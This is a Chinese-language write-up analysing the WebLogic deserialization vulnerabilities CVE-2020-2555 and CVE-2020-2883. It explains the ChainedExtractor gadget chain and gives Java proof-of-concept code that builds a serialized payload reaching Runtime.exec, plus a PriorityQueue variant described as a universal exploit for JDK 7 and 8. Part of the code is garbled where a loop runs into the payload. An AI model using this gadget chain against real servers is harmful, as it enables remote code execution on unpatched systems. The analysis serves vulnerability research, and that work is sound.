## Weblogic 2020-2555&2883分析
> 这两个洞是相近的，所以放在一起讲
  * 共通的核心触发点
    1. ChainedExtractor
                public class ChainedExtractor extends AbstractCompositeExtractor {
         ......
         public ChainedExtractor(ValueExtractor[] aExtractor) {
         super(aExtractor);
        }
        ......
        public Object extract(Object oTarget) {
         ValueExtractor[] aExtractor = this.getExtractors();
         int i = 0;
         for(int c = aExtractor.length; i  /tmp/123.txt"}});
            Object input = Runtime.class;
            ChainedExtractor b = new ChainedExtractor(new ReflectionExtractor[]{
                    first,second,third,
            });
            LimitFilter c = new LimitFilter();
            c.setComparator(b);
            c.setTopAnchor(input);
            BadAttributeValueExpException val = new BadAttributeValueExpException(null);
            Field valfield = val.getClass().getDeclaredField("val");
            valfield.setAccessible(true);
            valfield.set(val,c);
            File file = new File("./payload.ser");
            FileOutputStream fo = new FileOutputStream(file);
            ObjectOutputStream os = new ObjectOutputStream(fo);
            os.writeObject(val);
            FileInputStream fi = new FileInputStream("./payload.ser");
            ObjectInput oi = new ObjectInputStream(fi);
            oi.readObject();
        }
    }
最后的几行是模拟传输后，反序列化的过程
#### 弥补遗憾
`BadAttributeValueExpException`这个利用链并不能通杀，原因在于我们在jdk7中，是不存在toString()，这种操作的，因此，我们只能寻求别的办法，由于太像cc链了，所以我们去看看ysoserial中有什么骚操作，我们可以在CC2这条链中找到答案，这个链可以通杀主流的7，8版本
如果存在有compare可以触发extract，那么就可以替换那一环就完成整个链
这里就可以完成，我们就可以快乐照抄了
    PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
      queue.add("1");
      queue.add("1");
跑起来在这里卡住了，进行debug，我们可以发现，在进行add的时候会进入
在这里进行一轮compare，但由于我们在初始化的时候已经将调用链放入了其comparator参数中，所以会导致我们在这里就触发一轮链式攻击，但是queue必须要进行进行，初始化占位
  * 解决方案
我们先将一个正常的comparator初始化进入（ysoserial中前半部分基本照搬就行），完成add操作后再用反射，取出
    ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
            ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                    reflectionExtractor
            };
            ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);
            PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
            queue.add("1");
            queue.add("1");
            Class clazz = ChainedExtractor.class.getSuperclass();
            Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
            m_aExtractor.setAccessible(true);
            m_aExtractor.set(chainedExtractor1, valueExtractors);
            Field f = queue.getClass().getDeclaredField("queue");
            f.setAccessible(true);
            Object[] queueArray = (Object[]) f.get(queue);
            queueArray[0] = Runtime.class;
            queueArray[1] = "1";
至此我们完成了jdk7，8的通用poc，与此同时，我们也完成了对2883的分析，原因在与2883只是单纯修复我们的第一条链的第二环节，不过于此同时这个第二环可以用ConcurrentSkipListMap$SubMap和Mutations替代，这个有些复杂，大家可以自己去尝试
## 总结
  1. 要细心总结，玩了很多年的洞，说不定会换种形式，再归来
### 参考链接